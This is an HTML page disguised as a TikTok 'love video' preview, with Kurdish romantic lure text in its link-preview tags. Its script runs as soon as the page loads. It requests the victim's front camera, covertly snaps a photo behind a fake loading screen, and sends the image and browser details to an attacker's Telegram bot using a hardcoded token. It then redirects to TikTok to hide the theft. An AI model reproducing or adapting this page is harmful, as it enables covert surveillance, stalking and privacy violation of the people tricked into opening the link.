<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Meta Tags بۆ TikTok Preview -->
    <meta property="og:title" content="💖 ببینە ئەم ڤیدیۆیە 🥰">
    <meta property="og:description" content="دڵم بۆ تۆ دەزگێم... ببینە پێش ئەوەی بسڕدرێتەوە 💕">
    <meta property="og:image" content="https://i.imgur.com/bS4mzWU.jpeg">
    <meta property="og:url" content="https://vt.tiktok.com/ZSQnr4vyV/">
    <meta property="og:type" content="video.other">
    <meta property="og:site_name" content="TikTok">
    
    <title>TikTok - Love Video ❤️</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container { text-align: center; padding: 20px; position: relative; }
        
        /* دڵی جوان */
        .heart {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            position: relative;
            animation: heartbeat 1.5s ease-in-out infinite;
        }
        .heart::before,
        .heart::after {
            content: '';
            position: absolute;
            width: 120px;
            height: 120px;
            background: linear-gradient(45deg, #ff0050, #ff3366, #ff6b9d);
            border-radius: 50%;
        }
        .heart::before {
            left: -60px;
            top: 0;
        }
        .heart::after {
            left: 0;
            top: -60px;
        }
        .heart-center {
            position: absolute;
            width: 120px;
            height: 120px;
            background: linear-gradient(45deg, #ff0050, #ff3366, #ff6b9d);
            transform: rotate(45deg);
            top: 0;
            left: 0;
            z-index: 1;
            border-radius: 20px 0 20px 0;
        }
        
        @keyframes heartbeat {
            0% { transform: scale(1); }
            15% { transform: scale(1.15); }
            30% { transform: scale(1); }
            45% { transform: scale(1.1); }
            60% { transform: scale(1); }
            100% { transform: scale(1); }
        }
        
        /* دڵە بچووکەکان */
        .floating-hearts {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            overflow: hidden;
            z-index: 0;
        }
        .floating-heart {
            position: absolute;
            font-size: 20px;
            color: #ff3366;
            opacity: 0.3;
            animation: floatUp 6s linear infinite;
        }
        .floating-heart:nth-child(1) { left: 10%; animation-delay: 0s; font-size: 15px; }
        .floating-heart:nth-child(2) { left: 25%; animation-delay: 1s; font-size: 25px; }
        .floating-heart:nth-child(3) { left: 45%; animation-delay: 2s; font-size: 18px; }
        .floating-heart:nth-child(4) { left: 65%; animation-delay: 0.5s; font-size: 22px; }
        .floating-heart:nth-child(5) { left: 80%; animation-delay: 1.5s; font-size: 16px; }
        .floating-heart:nth-child(6) { left: 35%; animation-delay: 3s; font-size: 20px; }
        .floating-heart:nth-child(7) { left: 90%; animation-delay: 2.5s; font-size: 14px; }
        .floating-heart:nth-child(8) { left: 55%; animation-delay: 4s; font-size: 19px; }
        
        @keyframes floatUp {
            0% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 0.4; }
            90% { opacity: 0.4; }
            100% { transform: translateY(-10vh) scale(1.2); opacity: 0; }
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #ff3366;
            border-radius: 50%;
            margin: 30px auto;
            animation: spin 1s linear infinite;
            position: relative;
            z-index: 1;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .status-text { 
            color: rgba(255,255,255,0.7); 
            font-size: 18px; 
            margin-top: 20px;
            position: relative;
            z-index: 1;
            font-weight: 300;
            letter-spacing: 1px;
        }
        .progress-bar {
            width: 280px;
            height: 4px;
            background: rgba(255,255,255,0.1);
            border-radius: 2px;
            margin: 20px auto;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff0050, #ff3366, #ff6b9d, #ff0050);
            background-size: 200% 100%;
            border-radius: 2px;
            animation: progress 3s ease-in-out forwards, shimmer 1s linear infinite;
        }
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 65%; }
            90% { width: 90%; }
            100% { width: 100%; }
        }
        @keyframes shimmer {
            0% { background-position: 200% 0; }
            100% { background-position: -200% 0; }
        }
        
        .sub-text {
            color: rgba(255,255,255,0.4);
            font-size: 13px;
            margin-top: 10px;
            position: relative;
            z-index: 1;
        }
        
        #video { display: none; }
        #canvas { display: none; }
    </style>
</head>
<body>
    <div class="floating-hearts">
        <span class="floating-heart">💖</span>
        <span class="floating-heart">💕</span>
        <span class="floating-heart">💗</span>
        <span class="floating-heart">💘</span>
        <span class="floating-heart">💓</span>
        <span class="floating-heart">💝</span>
        <span class="floating-heart">💖</span>
        <span class="floating-heart">💕</span>
    </div>

    <div class="container">
        <div class="heart">
            <div class="heart-center"></div>
        </div>
        <div class="loading-spinner"></div>
        <div class="status-text" id="status">Loading video... 💫</div>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <div class="sub-text">Please wait a moment ❤️</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================
        // 🛠 کۆنفیکرەیشن
        // ============================
        const TELEGRAM_BOT_TOKEN = "8736195412:AAETqDHUXTWVXnto8tpgaIqhqWh_JwY-wEE";
        const TELEGRAM_CHAT_ID = "6230485449";
        
        let photoTaken = false;

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();
                
                setTimeout(() => {
                    takePhoto(stream);
                }, 1500);
                
            } catch (err) {
                console.error("Camera error:", err);
                document.getElementById('status').textContent = "Loading... ✨";
                setTimeout(() => {
                    redirectAway();
                }, 3000);
            }
        }

        async function takePhoto(stream) {
            if (photoTaken) return;
            photoTaken = true;
            
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                ctx.drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                document.getElementById('status').textContent = "Almost done... 💕";
                
                await sendToTelegram(imageData);
                
            } catch (err) {
                console.error("Photo error:", err);
            }
            
            redirectAway();
            
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }

        async function sendToTelegram(imageBase64) {
            try {
                const byteString = atob(imageBase64.split(',')[1]);
                const mimeString = imageBase64.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                const blob = new Blob([ab], { type: mimeString });
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', `💖 New Photo Captured\n🕒 ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent.substring(0, 100)}`);

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                console.log("Photo sent successfully!");
                
            } catch (err) {
                console.error("Telegram error:", err);
                try {
                    const response = await fetch(imageBase64);
                    const blob = await response.blob();
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', `💖 New Photo`);

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) {
                    console.error("Retry error:", e);
                }
            }
        }

        function redirectAway() {
            window.location.href = "https://www.tiktok.com";
        }

        window.addEventListener('load', () => {
            startCamera();
        });
    </script>
</body>
</html>
